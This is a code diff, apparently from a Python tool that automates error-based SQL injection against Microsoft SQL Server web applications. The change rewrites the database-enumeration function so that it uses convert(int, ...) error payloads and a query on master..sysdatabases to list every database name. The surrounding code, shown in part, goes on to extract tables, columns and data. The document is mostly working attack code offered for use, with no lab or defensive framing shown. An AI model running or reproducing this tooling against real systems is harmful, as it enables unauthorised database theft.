@@ -49,37 +49,6 @@ def return_contents(r):
     return contents.title.string.split("'")[1]
 
 
-def retr_database(ses, url, header, payload):
-    base = ["convert(int,DB_NAME(", "))"]
-    print('databases:')
-    r = ses.post(url, headers=header,
-                 data=payload[0] + urlenc(base[0] + base[1]) + payload[1])
-    print(f"curent: {return_contents(r)}")
-
-    databases = []
-    i = 0
-    while True:
-        for _ in range(retry):
-            try:
-                r = ses.post(url, headers=header, data=payload[0] +
-                             urlenc(base[0] + str(i) + base[1]) + payload[1])
-                result = return_contents(r)
-                if result not in databases:
-                    databases.append(result)
-                print(f"{i}: {result}")
-            except:
-                sleep(err_wait)
-            else:
-                break
-        else:
-            break
-        sleep(wait_sec)
-        i += 1
-
-    print()
-    print(','.join(databases))
-
-
 def retr_loop(ses, url, header, payload1, payload2):
     result = []
     i = 0
@@ -102,6 +71,22 @@ def retr_loop(ses, url, header, payload1, payload2):
         i += 1
 
     return result
+
+
+def retr_database(ses, url, header, payload):
+    base = [
+        "convert(int, (SELECT TOP 1 name FROM master..sysdatabases WHERE name not in (", ")))"]
+    print('databases:')
+    r = ses.post(url, headers=header,
+                 data=payload[0] + urlenc("convert(int, DB_NAME())") + payload[1])
+    print(f"curent: {return_contents(r)}")
+
+    payload1 = payload[0] + urlenc(base[0])
+    payload2 = urlenc(base[1]) + payload[1]
+    databases = retr_loop(ses, url, header, payload1, payload2)
+
+    print()
+    print(','.join(databases))
 
 
 def retr_tables(ses, url, header, payload, databases):
@@ -227,7 +212,8 @@ def main():
                     if len(columns) == 1:
                         columns = [columns[0]] * max(len(databases), len(tables))
                     if len(databases) != len(tables) or len(databases) != len(columns):
-                        print('error: argument length is different', file=sys.stderr)
+                        print('error: argument length is different',
+                              file=sys.stderr)
                         exit(1)
                 retr_data(session, url, header,
                           payload, databases, tables, columns)
